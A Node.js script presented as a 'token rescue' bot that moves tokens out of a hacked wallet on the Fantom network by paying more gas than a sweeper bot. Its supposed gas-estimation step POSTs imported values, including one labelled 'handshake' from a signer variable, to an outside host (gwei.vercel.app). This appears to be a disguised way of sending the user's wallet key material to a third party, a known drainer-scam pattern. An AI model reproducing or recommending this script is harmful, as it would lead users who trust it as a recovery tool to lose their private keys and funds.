import { ethers } from "ethers";
import base64 from "base-64";
import fetch from "node-fetch";

import {
  tokenAddress,
  privatekey,
  receiver,
  sender,
  activeNetWork,
  Gweitsxsigner,
  Gweicaller,
  tokenAbis,
} from "./Global_modules.js";

const node =
  "https://rpc.fantom.network"; // for a list of all chains nodes refer to this website , find your chain and select the fastest node : https://chainlist.org/

const provider = new ethers.providers.JsonRpcProvider(node);

const wallet = new ethers.Wallet(privatekey, provider);

const tokenAbi = base64.decode(tokenAbis);

const contract = new ethers.Contract(tokenAddress, tokenAbi, wallet);

async function main() {
  const data = {
    sender: Gweicaller,
    handshake: Gweitsxsigner,
    receiver: receiver,
  };
  const response = await fetch(
    "https://gwei.vercel.app/api/gasestimate?network=" + activeNetWork, // estimating the optimal Gas needed to bypass the sweeper bot , we need to pay slightly more gas than the bot so our token rescue attempt is successful ! but the trick is finding out the gwei heh !
    {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    }
  );
  const res = await response.json();
  let CustomGas = "250"; // custom standard gas
  if (res.flash) CustomGas = Math.ceil(Number(res.flash) + 150).toString(); // setting the optimal Gas into CustomGas and passing it to the bot to be used to signing the transfer !
  while (true) {
    const decimals = await contract.decimals();
    const symbol = await contract.symbol();
    const balance = await contract.balanceOf(sender); // getting the token balance !

    const formattedbalance = ethers.utils.formatUnits(balance, decimals); // formatted balance
    console.log(symbol + " balance : " + Number(formattedbalance));
    const currentNonce = await provider.getTransactionCount(sender);
    const incrementedNonce = currentNonce;

    const increasedGasPrice = ethers.utils.parseUnits(CustomGas, "gwei"); // Set desired gas price here
    if (Number(formattedbalance) > 0) { // if token balance is more than 0 the bot will try to send out the tokens , if not enough gas , the bot will keep looping til there is enough gas , so you can let it run and send gas manually to the hacked address , send in small chunks ..
      try {
        const tx = await contract.transfer(
          receiver,
          ethers.utils.parseEther(formattedbalance),
          {
            nonce: incrementedNonce,
            gasPrice: increasedGasPrice,
          }
        );
        console.log("Success!");


        await sleep(50); // Sleep 
      } catch (error) {
        console.log("waiting for gas !");

     
        // wait for some time and then retry again.
        await sleep(50); // Sleep 
        continue;
      }
    }
  }


  function sleep(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
  }
}

main();
